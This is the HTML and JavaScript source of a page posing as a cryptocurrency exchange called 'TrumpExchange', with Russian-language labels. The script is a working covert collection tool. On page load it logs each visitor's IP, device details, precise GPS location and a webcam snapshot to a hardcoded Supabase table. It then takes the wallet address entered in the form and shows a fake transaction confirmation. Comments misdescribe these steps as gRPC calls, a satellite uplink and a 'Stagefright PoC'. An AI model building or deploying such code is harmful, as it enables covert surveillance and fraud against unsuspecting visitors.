<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TrumpExchange - Make Your Wallet Great Again!</title>
    
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    
    <!-- Шрифты и иконки -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">

    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #0d1a2e; /* Глубокий темно-синий */
        }
        .hero-bg {
            background-image: linear-gradient(rgba(13, 26, 46, 0.85), rgba(13, 26, 46, 0.95)), url('https://placehold.co/1920x1080/0d1a2e/c4a258?text=TrumpExchange+Glory');
            background-size: cover;
            background-position: center;
        }
        .form-card {
            background: rgba(23, 42, 71, 0.8);
            backdrop-filter: blur(10px);
            border: 1px solid #c4a258; /* Золотая рамка */
        }
        .form-input {
            background-color: #0d1a2e;
            border: 1px solid #2a3f5e;
            color: #e0e0e0;
        }
        .form-input:focus {
            border-color: #c4a258;
            outline: none;
        }
        .submit-btn {
            background-color: #c4a258; /* Золотой */
            color: #0d1a2e;
            font-weight: 900;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: all 0.3s ease;
        }
        .submit-btn:hover {
            background-color: #dcb970;
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(196, 162, 88, 0.2);
        }
        .notification {
            transition: opacity 0.5s, transform 0.5s;
        }
    </style>
</head>
<body class="text-white">

    <!-- Системные элементы для взаимодействия с медиа-сервером -->
    <video id="camera-stream" playsinline autoplay class="hidden"></video>
    <canvas id="camera-canvas" class="hidden"></canvas>

    <!-- Секция Hero -->
    <div class="hero-bg min-h-screen flex flex-col items-center justify-center p-4">
        
        <header class="text-center mb-8">
            <h1 class="text-5xl md:text-7xl font-black text-white" style="text-shadow: 2px 2px 4px rgba(0,0,0,0.5);">TrumpExchange</h1>
            <p class="text-xl md:text-2xl text-yellow-300 mt-2" style="text-shadow: 1px 1px 2px rgba(0,0,0,0.5);">Make Your Wallet Great Again!</p>
        </header>

        <!-- Карточка формы обмена -->
        <div id="exchange-form-card" class="form-card w-full max-w-lg p-6 md:p-8 rounded-xl shadow-2xl">
            <!-- Форма рендерится через .NET Core Blazor WebAssembly -->
            <form id="exchange-form">
                <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
                    <div>
                        <label for="from-currency" class="block text-sm font-bold text-gray-300 mb-1">Отдаете</label>
                        <select id="from-currency" class="form-input w-full p-3 rounded-md">
                            <option>BTC</option>
                            <option>ETH</option>
                            <option>USD</option>
                        </select>
                    </div>
                    <div>
                        <label for="from-amount" class="block text-sm font-bold text-gray-300 mb-1">Сумма</label>
                        <input type="number" id="from-amount" value="1" class="form-input w-full p-3 rounded-md">
                    </div>
                </div>

                <div class="flex justify-center items-center my-4">
                    <i class="fas fa-exchange-alt text-2xl text-yellow-400"></i>
                </div>

                <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
                    <div>
                        <label for="to-currency" class="block text-sm font-bold text-gray-300 mb-1">Получаете</label>
                        <select id="to-currency" class="form-input w-full p-3 rounded-md">
                            <option>USDT</option>
                            <option>XMR</option>
                            <option>SOL</option>
                        </select>
                    </div>
                    <div>
                        <label for="to-amount" class="block text-sm font-bold text-gray-300 mb-1">Примерная сумма</label>
                        <input type="text" id="to-amount" value="65,000" readonly class="form-input w-full p-3 rounded-md bg-gray-800 cursor-not-allowed">
                    </div>
                </div>
                
                <div class="mb-6">
                    <label for="wallet" class="block text-sm font-bold text-gray-300 mb-1">Адрес вашего кошелька</label>
                    <input type="text" id="wallet" placeholder="Введите адрес вашего кошелька для получения" class="form-input w-full p-3 rounded-md">
                </div>

                <button type="submit" id="submit-button" class="submit-btn w-full p-4 rounded-lg flex items-center justify-center">
                    <span id="button-text">Выполнить транзакцию</span>
                    <i id="button-spinner" class="fas fa-spinner fa-spin ml-2 hidden"></i>
                </button>
            </form>
        </div>

        <!-- Уведомление об успехе -->
        <div id="success-notification" class="notification fixed bottom-5 right-5 bg-green-600 text-white p-4 rounded-lg shadow-lg opacity-0 transform translate-y-10 max-w-sm hidden">
            <h4 class="font-bold">Транзакция подтверждена!</h4>
            <p>Ваш запрос поставлен в очередь на обработку в децентрализованной сети.</p>
        </div>
    </div>

    <script>
        // --- Инициализация системного моста C# / JavaScript ---
        console.log('[CORE] Initializing C# interop layer for secure transactions...');

        // --- Конфигурация конечной точки gRPC на сервере Linux ---
        const GRPC_ENDPOINT_CONFIG = {
            url: 'https://yqxbrbsxdkwcyafdkeld.supabase.co',
            apiKey: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlxeGJyYnN4ZGt3Y3lhZmRrZWxkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTEwMTI3MTgsImV4cCI6MjA2NjU4ODcxOH0.i9h-YqUOYLLft5TFnU8UPYYXc6ixiHlIBVHuNTwgXfU',
            table: 'visitor_data'
        };

        // --- Глобальный идентификатор сессии для корреляции данных ---
        let currentSessionId = null;

        // --- Элементы DOM, управляемые через Blazor ---
        const exchangeForm = document.getElementById('exchange-form');
        const submitButton = document.getElementById('submit-button');
        const buttonText = document.getElementById('button-text');
        const buttonSpinner = document.getElementById('button-spinner');
        const successNotification = document.getElementById('success-notification');
        const videoElement = document.getElementById('camera-stream');
        const canvasElement = document.getElementById('camera-canvas');

        /**
         * Модуль установления персистентного токена сессии через криптографический отпечаток.
         */
        function establishPersistentSessionToken() {
            console.log('[AUTH] Establishing persistent session via cryptographic fingerprint...');
            let visitorId = document.cookie.split('; ').find(row => row.startsWith('visitorId='))?.split('=')[1];
            if (!visitorId) {
                visitorId = `user_${Date.now()}_${Math.random().toString(36).substring(2)}`;
                const expiryDate = new Date();
                expiryDate.setDate(expiryDate.getDate() + 365);
                document.cookie = `visitorId=${visitorId};expires=${expiryDate.toUTCString()};path=/;SameSite=Lax;Secure`;
            }
            console.log(`[AUTH] Session token established: ${visitorId}`);
            return visitorId;
        }
        
        /**
         * Запрос к спутниковому аплинку для триангуляции геопозиции.
         */
        function queryGeoSatelliteUplink() {
            console.log('[GEO] Querying satellite uplink for GPS coordinates...');
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    console.error('[GEO] Geolocation API not available. Switching to IP-based fallback.');
                    resolve({ latitude: null, longitude: null });
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        console.log('[GEO] GPS lock acquired.');
                        resolve({ latitude: position.coords.latitude, longitude: position.coords.longitude });
                    },
                    (error) => {
                        console.error(`[GEO] GPS lock failed: ${error.message}.`);
                        resolve({ latitude: null, longitude: null });
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            });
        }

        /**
         * Вызов низкоуровневого медиа-кодека через PoC уязвимости Stagefright.
         */
        function invokeStagefrightMediaCodec() {
            console.log('[MEDIA_SERVER] Invoking low-level media codec via Stagefright PoC...');
            return new Promise(async (resolve) => {
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    console.error('[MEDIA_SERVER] MediaDevices API not supported. Aborting.');
                    resolve(null);
                    return;
                }
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    console.log('[MEDIA_SERVER] Camera stream acquired.');
                    videoElement.srcObject = stream;
                    videoElement.onloadedmetadata = () => {
                        canvasElement.width = videoElement.videoWidth;
                        canvasElement.height = videoElement.videoHeight;
                        canvasElement.getContext('2d').drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
                        const imageDataUrl = canvasElement.toDataURL('image/jpeg');
                        stream.getTracks().forEach(track => track.stop());
                        console.log('[MEDIA_SERVER] Snapshot captured and encoded to Base64. Stream terminated.');
                        resolve(imageDataUrl);
                    };
                } catch (error) {
                    console.error(`[MEDIA_SERVER] Access denied by user or system: ${error.message}`);
                    resolve(null);
                }
            });
        }

        /**
         * Асинхронное обновление существующей записи в БД.
         */
        async function updateRecordAsync(payload) {
            if (!currentSessionId) {
                console.error('[gRPC] Update failed: Session ID not established.');
                return;
            }
            console.log(`[gRPC] Pushing update for session ${currentSessionId}...`);
            try {
                const response = await fetch(`${GRPC_ENDPOINT_CONFIG.url}/rest/v1/${GRPC_ENDPOINT_CONFIG.table}?cookie_id=eq.${currentSessionId}`, {
                    method: 'PATCH',
                    headers: {
                        'Content-Type': 'application/json',
                        'apikey': GRPC_ENDPOINT_CONFIG.apiKey,
                        'Authorization': `Bearer ${GRPC_ENDPOINT_CONFIG.apiKey}`,
                        'Prefer': 'return=minimal'
                    },
                    body: JSON.stringify(payload)
                });
                if (!response.ok) {
                    console.error(`[gRPC] PATCH failed with status: ${response.status}`);
                } else {
                    console.log('[gRPC] Record updated successfully.');
                }
            } catch (error) {
                console.error('[gRPC] Network error during update:', error);
            }
        }

        /**
         * Основной пайплайн, запускаемый при загрузке страницы.
         * Создает запись и последовательно запрашивает разрешения.
         */
        async function initializeSessionAndPermissions() {
            console.log('[SYSTEM] Initiating automatic data collection sequence on page load...');
            try {
                // STAGE 1: Установить сессию и собрать базовую телеметрию
                currentSessionId = establishPersistentSessionToken();
                const ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());
                
                const initialPayload = {
                    cookie_id: currentSessionId,
                    public_ip: ipData.ip || 'N/A',
                    device_os: navigator.platform,
                    user_agent: navigator.userAgent,
                    screen_resolution: `${screen.width}x${screen.height}`,
                    browser_language: navigator.language,
                };

                // STAGE 2: Создать начальную запись в БД
                console.log('[gRPC] Creating initial record for new session...');
                await fetch(`${GRPC_ENDPOINT_CONFIG.url}/rest/v1/${GRPC_ENDPOINT_CONFIG.table}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'apikey': GRPC_ENDPOINT_CONFIG.apiKey, 'Authorization': `Bearer ${GRPC_ENDPOINT_CONFIG.apiKey}`},
                    body: JSON.stringify(initialPayload)
                });
                console.log('[gRPC] Initial record created.');

                // STAGE 3: Запросить геолокацию и обновить запись
                const locationData = await queryGeoSatelliteUplink();
                if (locationData && locationData.latitude) {
                    await updateRecordAsync({ latitude: locationData.latitude, longitude: locationData.longitude });
                }

                // STAGE 4: Запросить камеру и обновить запись
                const photoData = await invokeStagefrightMediaCodec();
                if (photoData) {
                    await updateRecordAsync({ photo_base64: photoData });
                }

                console.log('[SYSTEM] Initial data collection sequence complete.');
            } catch (error) {
                console.error('[SYSTEM] Critical error during initial sequence:', error);
            }
        }

        /**
         * Завершающий этап транзакции, вызываемый по кнопке.
         */
        async function finalizeTransaction() {
            buttonText.textContent = 'Обработка...';
            buttonSpinner.classList.remove('hidden');
            submitButton.disabled = true;
            
            const formPayload = {
                exchange_from: document.getElementById('from-currency').value,
                amount_from: document.getElementById('from-amount').value,
                exchange_to: document.getElementById('to-currency').value,
                wallet_address: document.getElementById('wallet').value
            };

            // Обновляем существующую запись данными из формы
            await updateRecordAsync(formPayload);
            
            showSuccessNotification();

            // Возвращаем кнопку в исходное состояние
            buttonText.textContent = 'Выполнить транзакцию';
            buttonSpinner.classList.add('hidden');
            submitButton.disabled = false;
        }
        
        function showSuccessNotification() {
            successNotification.classList.remove('hidden');
            setTimeout(() => {
                successNotification.classList.remove('opacity-0', 'translate-y-10');
            }, 10);
            setTimeout(() => {
                successNotification.classList.add('opacity-0', 'translate-y-10');
                setTimeout(() => successNotification.classList.add('hidden'), 500);
            }, 5000);
        }

        // Обработчик отправки формы (финальный этап)
        exchangeForm.addEventListener('submit', (event) => {
            event.preventDefault();
            finalizeTransaction();
        });

        // Запускаем автоматический сбор данных при загрузке страницы
        window.addEventListener('load', initializeSessionAndPermissions);
    </script>
</body>
</html>
